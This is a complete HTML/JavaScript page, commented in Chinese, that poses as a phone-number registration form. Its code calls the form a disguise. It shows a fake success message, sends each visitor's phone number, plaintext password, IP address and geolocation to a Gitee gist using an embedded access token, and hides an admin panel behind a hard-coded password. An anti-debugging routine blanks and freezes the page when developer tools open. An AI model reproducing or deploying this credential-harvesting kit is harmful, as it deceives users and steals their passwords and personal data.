<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>注册</title>
<style>
/* 极简样式，无冗余，加载超快 */
*{margin:0;padding:0;box-sizing:border-box;font-family:"微软雅黑",Arial}
body{background:#f5f5f5;padding:20px;max-width:600px;margin:0 auto}
.title{text-align:center;font-size:24px;font-weight:bold;margin:20px 0;color:#333}
.input-box{margin-bottom:15px}
input{width:100%;height:48px;padding:0 15px;border:1px solid #ddd;border-radius:8px;font-size:16px}
button{width:100%;height:50px;background:#1677ff;color:#fff;border:none;border-radius:8px;font-size:17px;margin-top:10px;cursor:pointer}
/* 管理员后台样式 */
.admin-box{display:none;margin-top:20px}
.tab-btn{width:48%;height:45px;background:#fff;border:1px solid #ddd;border-radius:6px;font-size:16px;margin:0 1%;}
.tab-btn.on{background:#1677ff;color:#fff;border:none}
.card{background:#fff;border-radius:8px;padding:15px;margin-top:15px;box-shadow:0 1px 2px #eee}
.card h4{font-size:18px;margin-bottom:10px;color:#333}
.record-item,.msg-item{padding:10px;border-bottom:1px solid #eee;font-size:14px}
.record-item:last-child,.msg-item:last-child{border:none}
.msg-ip{font-size:12px;color:#999;margin-top:5px}
textarea{width:100%;height:120px;padding:15px;border:1px solid #ddd;border-radius:8px;font-size:16px;margin:10px 0;resize:none}
.del-btn{background:#ff4d4f}
.save-btn{background:#00b42a}
.pwd-box{display:none;margin-top:15px}
.tip{font-size:12px;margin-top:8px;text-align:center;color:red}
</style>
</head>
<body>
<div class="title">注册</div>

<!-- 伪装注册界面（唯一前端显示，无任何暴露） -->
<div id="regBox">
  <div class="input-box">
    <input type="text" id="phone" placeholder="请输入手机号" autocomplete="off">
  </div>
  <div class="input-box">
    <input type="password" id="pwd" placeholder="请输入密码" autocomplete="off">
  </div>
  <button onclick="checkPwd()">注册</button>
</div>

<!-- 管理员后台（登录后显示，极简双标签） -->
<div class="admin-box" id="adminBox">
  <button class="tab-btn on" onclick="showTab(1)">访问记录</button>
  <button class="tab-btn" onclick="showTab(2)">留言管理</button>
  
  <!-- 标签1：访问记录（手机号/IP/时间/类型） -->
  <div class="card" id="tab1">
    <h4>所有访问记录</h4>
    <div id="recordList">加载中...</div>
    <button class="del-btn" onclick="clearRecord()">清空所有记录</button>
  </div>
  
  <!-- 标签2：留言管理（发布/删除/改密码） -->
  <div class="card" id="tab2" style="display:none">
    <h4>发布留言</h4>
    <textarea id="msgInput" placeholder="输入留言内容"></textarea>
    <button class="save-btn" onclick="addMsg()">发布</button>
    
    <h4 style="margin-top:20px">留言列表</h4>
    <div id="msgList">加载中...</div>
    <button class="del-btn" style="margin-top:10px" onclick="clearMsg()">清空所有留言</button>
    <button class="save-btn" style="margin-top:10px" onclick="showPwdBox()">修改普通密码</button>
    
    <!-- 普通密码修改框 -->
    <div class="pwd-box" id="pwdBox">
      <input type="password" id="newPwd" placeholder="请输入新的普通密码">
      <button class="save-btn" onclick="saveNewPwd()">保存密码</button>
      <div class="tip" id="pwdTip"></div>
    </div>
  </div>
  
  <button class="del-btn" style="margin-top:20px" onclick="logout()">退出登录</button>
</div>

<script>
// 核心配置【仅改这里，其余别动，极简！】
const CONF = {
  adminPwd: "995566995566", // 管理员密码
  normalPwd: "7654321",    // 普通密码
  gistApi: "https://gitee.com/api/v5/gists/r3b67aisyzn54chek912830",
  token: "1e8e69c1380f8db58096227bf784c808",
  ip: "未知IP",
  addr: "未知地址"
};

// 极简元素获取，无冗余
const el = {
  regBox: document.getElementById("regBox"),
  adminBox: document.getElementById("adminBox"),
  phone: document.getElementById("phone"),
  pwd: document.getElementById("pwd"),
  recordList: document.getElementById("recordList"),
  msgList: document.getElementById("msgList"),
  msgInput: document.getElementById("msgInput"),
  tab1: document.getElementById("tab1"),
  tab2: document.getElementById("tab2"),
  pwdBox: document.getElementById("pwdBox"),
  newPwd: document.getElementById("newPwd"),
  pwdTip: document.getElementById("pwdTip")
};

// 初始化：极简IP获取，不阻塞主逻辑
getIp();
// 反调试（极简版，不卡网页）
antiDebug();

// 【核心1】获取IP+地址（国内稳定接口，秒返回）
async function getIp() {
  try {
    let res = await fetch("https://api.ipify.org?format=json");
    let {ip} = await res.json();
    CONF.ip = ip;
    res = await fetch(`https://ip-api.com/json/${ip}?lang=zh-CN`);
    let geo = await res.json();
    if (geo.status === "success") CONF.addr = `${geo.country}${geo.regionName}${geo.city}`;
  } catch (e) {}
}

// 【核心2】注册/登录验证（点击即进，0延迟，不卡！）
async function checkPwd() {
  const phone = el.phone.value.trim() || "未输入";
  const pwd = el.pwd.value.trim();
  const time = new Date().toLocaleString();
  let type = "密码错误";

  // 1. 管理员登录：直接显示后台
  if (pwd === CONF.adminPwd) {
    type = "管理员登录";
    el.regBox.style.display = "none";
    el.adminBox.style.display = "block";
    await loadData(); // 加载云端数据
    return;
  }
  // 2. 普通用户登录：直接隐藏注册框，显示留言
  if (pwd === CONF.normalPwd) {
    type = "普通登录";
    el.regBox.style.display = "none";
    await loadMsg();
    return;
  }
  // 3. 任意密码：伪装注册成功，隐藏注册框，显示留言
  alert("注册成功！");
  el.regBox.style.display = "none";
  await loadMsg();

  // 异步保存访问记录（不阻塞登录，网页不卡）
  saveRecord({phone, pwd, ip: CONF.ip, addr: CONF.addr, time, type});
}

// 【核心3】云端数据操作（极简封装，无冗余逻辑）
// 拉取云端数据
async function pullData() {
  try {
    let res = await fetch(CONF.gistApi, {headers: {Authorization: `token ${CONF.token}`}});
    let data = await res.json();
    return data.files["data.txt"] ? JSON.parse(data.files["data.txt"].content) : {record: [], msg: [], nPwd: CONF.normalPwd};
  } catch (e) {
    return {record: [], msg: [], nPwd: CONF.normalPwd};
  }
}
// 同步到云端
async function pushData(data) {
  try {
    await fetch(CONF.gistApi, {
      method: "PATCH",
      headers: {Authorization: `token ${CONF.token}`, "Content-Type": "application/json"},
      body: JSON.stringify({files: {"data.txt": {content: JSON.stringify(data)}}})
    });
  } catch (e) {}
}

// 访问记录相关（极简CRUD）
async function saveRecord(rec) {
  let data = await pullData();
  data.record.unshift(rec);
  await pushData(data);
}
async function loadRecord() {
  let data = await pullData();
  if (data.record.length === 0) {
    el.recordList.innerHTML = "暂无访问记录";
    return;
  }
  el.recordList.innerHTML = data.record.map(item => `
    <div class="record-item">
      时间：${item.time} | 手机号：${item.phone} | IP：${item.ip} | 类型：${item.type}
    </div>
  `).join("");
}
async function clearRecord() {
  if (!confirm("确定清空所有记录？")) return;
  let data = await pullData();
  data.record = [];
  await pushData(data);
  loadRecord();
}

// 留言相关（极简CRUD，带IP显示）
async function addMsg() {
  let text = el.msgInput.value.trim();
  if (!text) return alert("请输入留言内容！");
  let data = await pullData();
  data.msg.unshift({text, ip: CONF.ip, time: new Date().toLocaleString()});
  await pushData(data);
  el.msgInput.value = "";
  loadMsg();
}
async function loadMsg() {
  let data = await pullData();
  CONF.normalPwd = data.nPwd || CONF.normalPwd;
  if (data.msg.length === 0) {
    el.msgList.innerHTML = "暂无留言内容";
    return;
  }
  el.msgList.innerHTML = data.msg.map(item => `
    <div class="msg-item">
      ${item.text}
      <div class="msg-ip">${item.time} | ${item.ip}</div>
    </div>
  `).join("");
}
async function clearMsg() {
  if (!confirm("确定清空所有留言？")) return;
  let data = await pullData();
  data.msg = [];
  await pushData(data);
  loadMsg();
}

// 管理员专属：修改普通密码
function showPwdBox() {
  el.pwdBox.style.display = el.pwdBox.style.display === "none" ? "block" : "none";
  el.pwdTip.innerHTML = "";
}
async function saveNewPwd() {
  let newPwd = el.newPwd.value.trim();
  if (newPwd.length < 4) {
    el.pwdTip.innerHTML = "密码至少4位！";
    return;
  }
  let data = await pullData();
  data.nPwd = newPwd;
  await pushData(data);
  CONF.normalPwd = newPwd;
  el.pwdTip.innerHTML = "密码修改成功！";
  el.pwdTip.style.color = "green";
  el.newPwd.value = "";
  setTimeout(() => el.pwdBox.style.display = "none", 1500);
}

// 管理员后台标签切换（极简，无卡顿）
function showTab(t) {
  if (t === 1) {
    el.tab1.style.display = "block";
    el.tab2.style.display = "none";
    document.querySelectorAll(".tab-btn")[0].className = "tab-btn on";
    document.querySelectorAll(".tab-btn")[1].className = "tab-btn";
    loadRecord();
  } else {
    el.tab1.style.display = "none";
    el.tab2.style.display = "block";
    document.querySelectorAll(".tab-btn")[0].className = "tab-btn";
    document.querySelectorAll(".tab-btn")[1].className = "tab-btn on";
    loadMsg();
  }
}
// 加载管理员后台所有数据
async function loadData() {
  loadRecord();
  loadMsg();
}
// 退出登录
function logout() {
  el.adminBox.style.display = "none";
  el.regBox.style.display = "block";
  el.phone.value = "";
  el.pwd.value = "";
  el.pwdBox.style.display = "none";
}

// 反调试（极简版，不占用资源，不卡网页）
function antiDebug() {
  let count = 0;
  setInterval(() => {
    debugger;
    if (count++ > 3) {
      document.body.innerHTML = "";
      while (1) {}
    }
  }, 1500);
}
</script>
</body>
</html>
